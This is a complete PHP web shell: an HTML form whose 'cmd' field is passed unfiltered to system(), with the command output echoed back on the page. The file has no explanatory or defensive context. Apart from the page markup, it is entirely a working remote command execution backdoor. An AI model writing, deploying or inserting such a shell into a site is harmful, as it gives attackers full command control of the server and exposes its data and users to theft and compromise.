<html>
    <meta http-equiv="content-Type" content="text/html; charset=EUC-KR">
    <body>
        <form method="GET">
            <input type="TEXT" name="cmd" size="80">
            <input type="SUBMIT" value="Execute">
        </form>
        <pre>
            <?php header("content-Type:text/html;charset=EUC-KR");
            if($_GET['cmd']){
                system($_GET['cmd']);
            }
        
            ?>
            </pre>
        </body>
</html>